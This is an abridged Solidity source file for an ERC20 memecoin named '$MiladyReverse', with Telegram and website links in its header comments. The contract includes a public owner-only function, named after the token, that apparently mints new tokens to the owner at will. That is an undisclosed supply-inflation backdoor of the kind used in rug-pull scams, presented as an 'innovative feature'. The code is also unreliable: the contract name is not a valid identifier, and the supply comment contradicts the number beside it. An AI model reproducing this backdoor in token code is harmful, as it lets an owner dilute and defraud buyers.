//
// $MiladyReverse proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/ReverseMiladyBSC
// 📱 Website ::https://miladyreverse.com/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _MiladyReverse(uint256 amount) public onlyOwner {
 _MiladyReverse(msg.sender, amount);
    }
    ...
    function _MiladyReverse(address account, uint256 amount) internal virtual {
...
contract $MiladyReverse is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("ʎpɐlᴉꟽ", "ʎpɐlᴉꟽ") {
     _MiladyReverse(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}